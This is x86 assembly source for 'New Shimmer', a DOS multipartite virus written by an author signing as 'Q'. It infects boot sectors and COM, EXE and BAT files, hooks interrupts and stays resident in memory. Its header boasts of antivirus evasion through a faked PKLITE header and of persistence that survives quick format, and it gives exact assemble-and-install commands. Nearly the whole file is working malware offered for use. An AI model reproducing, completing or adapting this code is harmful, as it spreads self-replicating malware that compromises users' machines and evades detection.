;designed by "Q" the misanthrope.

comment *

New Shimmer is a floor wax.
New Shimmer is a dessert topping.
It's a floor wax!
It's a dessert topping!
Floor wax!
Dessert topping!
No!  New Shimmer is BOTH a floor wax and a dessert topping.
I'll just spray some on the floor and some on your favorite dessert.
Umm, delicious, and look at that shine!
(Saturday Night Live 1977)

New Shimmer Virus is a Boot Sector.
New Shimmer Virus is a .COM File.
New Shimmer Virus is a .EXE File.
New Shimmer Virus is a .BAT File.
No.  The New Shimmer Virus is a .COM file and an .EXE file and a .BAT file
and a Boot Sector Virus.

Cool features:  
Aviods detection by faking PKLITE header.  (Thanks VLAD)
TBAV hueristics clean.
Floppy bootsector can not be cleaned with quick format.
Creates INSTALL.EXE's in default directory every time WINDOZE installs.
Disables the keyboard key lock.
HMA resident.
Stealthing.
Momentarily Color Video Resident.

tasm shimmer /m2
tlink shimmer
exe2bin shimmer.exe shimmer.bat
del shimmer.exe
format a:/q/u
debug shimmer.bat
l 300 0 0 1
w 100 0 0 1
w 300 0 20 1
m 11c,2fe 100
rcx
1e2
w
q
shimmer

*


.286


qseg            segment byte public 'CODE'
        assume  cs:qseg,es:qseg,ss:nothing,ds:qseg
        
        org     0000h

top:            jmp     short install
        
        db      90h                     
        db      'MSDOS5.0'
        dw      512
        db      1 
        dw      1 
        db      2 
        dw      224 
        dw      2880
        db      0f0h 
        dw      9
        dw      18 
        dw      2 


batch_file      proc    near
        db      ':'
        jns     com_code                
crlf:           db      0dh,0ah
        db      '@echo.PKX>install.exe',0dh,0ah
        db      '@copy/b install.exe+%0.bat>nul',0dh,0ah  
        db      '@install.exe',1ah                     
batch_file      endp
        

install         proc    near
        push    cs
        pop     ds
        push    ds
        cmp     word ptr ds:[0449h],07h
        cld     
        mov     si,bx
        mov     es,bx
        push    bx
        je      monochrome
        push    0b800h
        pop     es
        cmp     byte ptr es:[si+crlf-top],0dh
monochrome:     push    es
        mov     cx,previous_hook-top
        push    offset video_resident+7c00h
        mov     di,si
        push    cx
        push    si
        rep     movsb
        pop     si
        pop     cx
        rep     movsb
        mov     si,1ah*04h 
        retf
install         endp


com_code        proc    near                    
        mov     ah,0b1h               
        mov     di,0ffffh
        int     2fh
        inc     ax
        jz      no_load                 
com_code        endp


move_to_hma     proc    near                    
        mov     bx,previous_hook-batch_file+05h
        mov     ax,4a02h                
        int     2fh
        inc     di                      
        lea     ax,word ptr ds:[di+interrupt_2f-batch_file]
        jz      no_load                 
        cld
        mov     cx,previous_hook-batch_file
        mov     si,0105h
        rep     movsb                   
move_to_hma     endp


hook_in_int_2f  proc    near
        mov     si,0706h                
set_vector:     cld
        push    0000h
        pop     ds
        cmp     word ptr ds:[si+02h],0ffffh
        je      no_load
        movsw                           
        movsw                           
fill_vector:    mov     word ptr ds:[si-04h],ax 
        mov     word ptr ds:[si-04h+02h],es
hook_in_int_2f  endp


no_load         proc    near                    
        retn
no_load         endp


windows_line    db      'c:\windows'
winstart_line   db      '\winstart.bat',00h
        
        
video_resident  proc    near
        je      already_res
        mov     ax,offset interrupt_1a+7e00h-02h
        call    set_vector
already_res:    push    ds
        pop     es
re_get_boot:    mov     ax,0201h
video_resident  endp


set_cx_dx       proc    near      
        mov     bp,word ptr ds:[bx+11h]
        shr     bp,04h
        mov     cx,word ptr ds:[bx+16h]
        shl     cx,01h
        add     cx,bp
        inc     cx
        sub     cx,word ptr ds:[bx+18h]
        mov     dh,01h
        int     40h
        retf
set_cx_dx       endp


interrupt_40    proc    near
        cmp     cx,0001h
        jne     jmp_to_int40
        cmp     ah,02h
        jne     jmp_to_int40
        cmp     dh,ch
        jne     jmp_to_int40
        pushf
        push    cs
        call    jmp_to_int40
        jc      return_far_2
        pushf
        pusha
        push    ds
        push    es
        pop     ds
        cmp     word ptr ds:[bx+crlf-top],0a0dh
        je      get_old_bs
        mov     ax,0301h
        pusha
        push    cs
        call    set_cx_dx
        lea     di,ds:[bx+batch_file-top]
        cld
        mov     cx,previous_hook-batch_file
        call    next_line
next_line:      pop     si
        sub     si,next_line-batch_file
        rep     movs byte ptr es:[di],cs:[si]
        mov     al,60h
        out     64h,al
get_status:     in      al,64h
        test    al,02h
        loopnz  get_status
        mov     al,4bh
        out     60h,al
        mov     word ptr ds:[bx],0000h
        org     $-2
        jmp     $(install-top)
        popa
        int     40h
get_old_bs:     push    cs
        call    re_get_boot
        pop     ds
        popa     
        popf
return_far_2:   sti
        retf    02h
interrupt_40    endp


vname:          db      'New Shimmer'


interrupt_2f    proc    near
        cmp     ah,0b1h               
        jne     try_install
        xchg    ax,di
        iret
try_install:    pushf
        pusha
        push    ds
        push    es
        call    set_int40
jmp_to_int40:   db      0eah
        db      'By Q'
set_int40:      pop     di
        lea     ax,word ptr ds:[di+(interrupt_40-jmp_to_int40)]
        mov     si,40h*04h
        inc     di
        jmp     short set_vec_pop_it
interrupt_2f    endp


interrupt_21    proc    near                
        pushf
        pusha   
        push    ds
        push    es
        push    cs
        pop     ds
        cmp     ah,4bh
        je      set_21_back
        mov     ax,4300h
        mov     byte ptr ds:[winstart_line+7e00h-02h],al
        mov     dx,offset windows_line+7e00h-02h
        int     18h
        jc      pop_it
        mov     dx,offset windows_line+7c00h                
        mov     ah,5bh
        mov     cx,0001h
        int     18h
        jc      set_21_back
        xchg    ax,bx
        mov     ah,40h
        in      al,40h
        or      al,02h
        mov     ch,al
        mov     dl,low(offset batch_file+7c00h)
        int     18h
        mov     ah,3eh
        int     18h
set_21_back:    mov     si,21h*04h
        les     ax,dword ptr ds:[previous_hook+7c00h]
        jmp     short set_vec_pop
interrupt_21    endp


        org     001c7h


interrupt_1a    proc    near                
        pushf   
        pusha
        mov     ax,1200h
        push    ds
        cwd
        push    es
        int     2fh
        inc     al
        jnz     pop_it
        mov     ds,dx
        mov     si,18h*04h+04h
        les     ax,dword ptr ds:[si+(21h*04h)-(18h*04h+04h)]
        call    fill_vector
        mov     di,offset previous_hook+7c00h
        les     ax,dword ptr cs:[di+0200h-02h]
        mov     si,1ah*04h+04h
        call    fill_vector
        mov     si,21h*04h
        mov     ax,offset interrupt_21+7c00h
set_vec_pop_it: push    cs
        pop     es
set_vec_pop:    call    set_vector
pop_it:         pop     es
        pop     ds
        popa    
        popf
interrupt_1a    endp


        org     001fdh                


far_jmp         proc    near
        db      0eah
previous_hook:  label   double
far_jmp         endp


boot_signature  dw      0aa55h 


qseg            ends


        end    
        